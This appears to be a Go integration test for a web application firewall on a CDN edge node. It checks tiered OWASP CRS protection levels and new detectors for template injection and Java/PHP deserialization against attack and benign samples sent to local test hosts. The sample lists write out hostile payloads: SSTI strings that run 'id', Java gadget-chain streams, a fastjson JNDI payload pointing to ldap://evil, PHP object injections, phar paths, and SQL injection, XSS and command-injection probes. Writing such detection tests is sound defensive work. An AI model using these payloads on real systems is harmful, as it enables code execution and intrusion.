package main

// -only tiers: the WAF protection tiers and the new rule groups on the real
// node, one shared server:
//   - per tier (仅记录 / 标准防护 / 严格防护 / 极严格防护) a CRS site; every
//     attack sample and every benign sample is sent to each: blocked counts
//     must not decrease from tier to tier and 仅记录 blocks nothing; the
//     benign samples a tier blocks are reported with the CRS rules they hit
//     (CRS's own false positives: an operator excludes those rules or groups);
//   - per new self-developed rule group (SSTI, Java / PHP deserialization) a
//     site whose WAF policy blocks on the node detector (cdnca_waf.lua,
//     operator detect): at least 15 attack samples blocked, zero of the 50+
//     benign samples (JSON, rich text, Base64 images, legitimate {{}} text).
// Samples go as a query argument and as a form body.

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/cdnca/cdnca/agents/edge-agent/internal/edgegolden/goldendyn"
	"github.com/cdnca/cdnca/libs/edgeconfig"
	"github.com/cdnca/cdnca/libs/edgeconfig/edgesite"
)

func javaStream(class string) string {
	head := []byte{0xac, 0xed, 0x00, 0x05, 0x73, 0x72}
	head = binary.BigEndian.AppendUint16(head, uint16(len(class)))
	return string(append(append(head, class...), 0, 0, 0, 0, 0, 0, 0, 1, 2, 0, 0, 0x78, 0x70))
}

const tinyPNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="

// tierSamples: attack samples per new rule group and benign samples.
func tierSamples() (map[string][]string, []string) {
	b64 := func(value string) string { return base64.StdEncoding.EncodeToString([]byte(value)) }
	cc := javaStream("org.apache.commons.collections.functors.InvokerTransformer")
	bad := javaStream("javax.management.BadAttributeValueExpException")
	session := javaStream("com.example.Session")
	phpObject := `O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}`
	attacks := map[string][]string{
		"ssti": {"{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
			"{{self.__init__.__globals__}}", "{{lipsum.__globals__.os.popen('id').read()}}",
			"${T(java.lang.Runtime).getRuntime().exec('id')}", `${"freemarker.template.utility.Execute"?new()("id")}`,
			`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, "<%= 7*7 %>", "<%= system('id') %>",
			"{{constructor.constructor('return process')()}}", "{{ request['application']['__globals__'] }}",
			"{{_self.env.registerUndefinedFilterCallback('exec')}}", "{{['id']|filter('system')}}", "@{7*7}"},
		"java_deser": {b64(cc), b64(bad), b64(session), hex.EncodeToString([]byte(cc)), hex.EncodeToString([]byte(session)),
			strings.ToUpper(hex.EncodeToString([]byte(bad))), strings.NewReplacer("+", "-", "/", "_").Replace(b64(cc)),
			`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/x","autoCommit":true}`,
			`{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}`,
			`["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"ldap://x"}]`,
			`<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"/></dynamic-proxy></sorted-set>`,
			`<java.util.PriorityQueue serialization="custom"><unserializable-parents/></java.util.PriorityQueue>`,
			b64(javaStream("org.apache.commons.beanutils.BeanComparator")), b64(javaStream("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")),
			b64(javaStream("org.codehaus.groovy.runtime.ConvertedClosure")), "x " + hex.EncodeToString([]byte(cc)) + " y"},
		"php_deser": {phpObject, `O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`, `a:1:{i:0;O:8:"stdClass":0:{}}`,
			`O:+8:"stdClass":1:{}`, `C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}`,
			`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{}`, `O:17:"Monolog\Handler\X":1:{}`, b64(phpObject),
			b64(`O:4:"User":1:{s:2:"id";i:1;}`), strings.TrimRight(b64(phpObject), "="), "phar://uploads/avatar.jpg/test.txt",
			"PHAR://./a.phar", "phar:///var/www/up/x.gif", b64(`a:2:{i:0;s:1:"x";i:1;O:6:"Logger":1:{s:4:"file";s:9:"shell.php";}}`),
			`O:6:"Logger":1:{s:4:"file";s:9:"shell.php";}`, `O:11:"Exploit\Foo":0:{}`},
		// classic probes the standard tier blocks (the CRS tier run)
		"classic": {"1' OR '1'='1", "1 UNION SELECT username,password FROM users", "<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>", "../../../../etc/passwd", "; cat /etc/passwd", "$(id)", "http://evil.test/shell.txt?"},
	}
	benign := []string{"hello world", "{{name}}", "{{ user.name }}", "{{user.profile.name}}", "{{ name | upper }}",
		"Hello {{first_name}}, your order {{order_id}} shipped", "{{#each items}}{{this}}{{/each}}", "{{> header}}",
		"${HOME}", "${user}", "#{id}", "{% if user %}hi{% endif %}", "<%= name %>", "price: ${price}",
		`{"a":1,"b":[1,2,3]}`, `{"user":{"name":"Tom","email":"tom@example.com"},"tags":["a","b"]}`,
		`{"template":"{{title}} - {{site}}","version":"2024-10-14"}`, `{"@type":"Person","name":"Jane"}`,
		`{"@context":"https://schema.org","@type":"Product","name":"Phone"}`,
		"<p>Hello <b>world</b></p><ul><li>one</li><li>two</li></ul>", "<h2>Release notes</h2><p>Fixed 3-4 bugs; see {{docs}}.</p>",
		"<blockquote>a * b is multiplication</blockquote>", "Math: 7 * 7 = 49 and 10/2 = 5", "2024-10-14", "10-20 items",
		"data:image/png;base64," + tinyPNG, tinyPNG, "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
		"Order O:12 shipped", "ratio 3:4", "the pharmacy is open", "phar is a PHP archive format", "rO0 is not a word",
		"use java.util.HashMap in your code", "com.example.Session", "Java serialization talk at 7pm",
		"Tom and Jerry", "user@example.com", "https://example.com/a?b=1", "O'Brien", "it's a nice day",
		"50% off {{today}}", "#{user.name}", "${user.address.city}", "x = {a: 1}", "function() { return 1 }",
		"review: great product, 5 stars", "search: blue shoes size 42", "Ünïcödé text", "rock and roll", "C# and C++ jobs",
		"page 2 of 10", "SKU-12345-XL", "id=123"}
	return attacks, benign
}

func detectorHost(detector string) string { return strings.ReplaceAll(detector, "_", "-") + ".waf.test" }

var auditRuleID = regexp.MustCompile(`"ruleId":"(9[0-9]{5})"`)

// auditRules counts the CRS rule IDs in the audit log written after offset.
func auditRules(offset int64) (map[string]int, int64) {
	raw, _ := os.ReadFile(filepath.Join(*state, goldendyn.SharedDirectory, "modsecurity-audit.log"))
	counts := map[string]int{}
	if int64(len(raw)) > offset {
		for _, match := range auditRuleID.FindAllStringSubmatch(string(raw[offset:]), -1) {
			counts[match[1]]++
		}
	}
	return counts, int64(len(raw))
}

// detectorPolicy blocks on one node detector (args: query and body values).
func detectorPolicy(detector string) edgesite.RulePlan {
	rule, err := edgeconfig.NormalizeSecurityRule(edgeconfig.WAFRule{RuleID: "0d110000-0000-4000-8000-0000000000a1",
		Match: edgeconfig.WAFMatch{Inspect: []edgeconfig.WAFInspect{{Target: "args", Operator: "detect", Values: []string{detector}}}},
		Action: edgeconfig.WAFBlock, Control: edgeconfig.WAFStop})
	if err != nil {
		panic(err)
	}
	return edgesite.RulePlan{HeaderOverflow: edgesite.HeaderOverflowNoMatch, Policies: []edgesite.RulePolicy{{
		Kind: edgeconfig.SecurityWAF, PolicyID: "0d110000-0000-4000-8000-0000000000b1", PolicyVersion: 1, BindingRevision: 1,
		RuntimeSHA256: strings.Repeat("a", 64), Enabled: true, DefaultAction: edgeconfig.WAFAllow, Rules: []edgeconfig.WAFRule{rule}}}}
}

// blocked sends a value as a query argument and as a form body; true if
// either is answered 403.
func blocked(host, value string) bool {
	query := get(host, "/t?v="+url.QueryEscape(value))
	form := do(client, http.MethodPost, host, "/t", strings.NewReader("v="+url.QueryEscape(value)), nil)
	return query == http.StatusForbidden || form == http.StatusForbidden
}

func tiersRun() {
	attacks, benign := tierSamples()
	all := profiles()
	tierPacks := []struct{ pack, name string }{{"system/crs-pl1-log", "仅记录"}, {"system/crs-pl1", "标准防护"},
		{"system/crs-pl2", "严格防护"}, {"system/crs-pl3", "极严格防护"}}
	detectors := []string{"ssti", "java_deser", "php_deser"}
	sites := []edgesite.Site{}
	for index, tier := range tierPacks {
		sites = append(sites, makeSite(20+index, fmt.Sprintf("tier%d.waf.test", index), &wafSpec{profile: profileNamed(all, tier.pack)}))
	}
	for index, detector := range detectors {
		site := makeSite(30+index, detectorHost(detector), nil)
		site.Security.Rules = detectorPolicy(detector)
		sites = append(sites, site)
	}
	n, err := startNode(sites, true)
	if err != nil {
		check("tiers start", false, "%v", err)
		return
	}
	defer stop()
	_ = n
	if get("tier0.waf.test", "/t?v=hello") != http.StatusOK {
		check("tiers start", false, "clean request not 200")
		return
	}
	attackList := []string{}
	for _, group := range []string{"classic", "ssti", "java_deser", "php_deser"} {
		attackList = append(attackList, attacks[group]...)
	}
	summary := map[string]any{"attack_samples": len(attackList), "benign_samples": len(benign)}
	previous := -1
	tiers := []map[string]any{}
	for index, tier := range tierPacks {
		host := fmt.Sprintf("tier%d.waf.test", index)
		hits, falsePositives := 0, []string{}
		for _, value := range attackList {
			if blocked(host, value) {
				hits++
			}
		}
		_, offset := auditRules(0)
		for _, value := range benign {
			if blocked(host, value) {
				falsePositives = append(falsePositives, value)
			}
		}
		rules, _ := auditRules(offset)
		tiers = append(tiers, map[string]any{"tier": tier.name, "pack": tier.pack, "blocked": hits, "false_positives": len(falsePositives),
			"false_positive_samples": falsePositives, "benign_rule_hits": rules})
		check("tier "+tier.name, hits >= previous, "blocked %d of %d attacks (previous tier %d), false positives %d of %d %q",
			hits, len(attackList), max(previous, 0), len(falsePositives), len(benign), falsePositives)
		if tier.pack == "system/crs-pl1-log" {
			check("tier 仅记录 records only", hits == 0 && len(falsePositives) == 0, "blocked %d", hits)
		}
		previous = hits
	}
	summary["tiers"] = tiers
	groups := []map[string]any{}
	for _, detector := range detectors {
		host := detectorHost(detector)
		hits, misses, falsePositives := 0, []string{}, []string{}
		for _, value := range attacks[detector] {
			if blocked(host, value) {
				hits++
			} else {
				misses = append(misses, value)
			}
		}
		for _, value := range benign {
			if blocked(host, value) {
				falsePositives = append(falsePositives, value)
			}
		}
		groups = append(groups, map[string]any{"group": detector, "blocked": hits, "attacks": len(attacks[detector]),
			"false_positives": len(falsePositives), "benign": len(benign)})
		check("group "+detector, hits >= 15 && len(misses) == 0 && len(falsePositives) == 0 && len(benign) >= 50,
			"blocked %d of %d (missed %q), false positives %d of %d %q", hits, len(attacks[detector]), misses,
			len(falsePositives), len(benign), falsePositives)
	}
	summary["groups"] = groups
	encoded, _ := json.Marshal(summary)
	fmt.Printf("TIERS %s\n", encoded)
	for _, line := range errorLines() {
		check("tiers error log", false, "%s", line)
	}
}
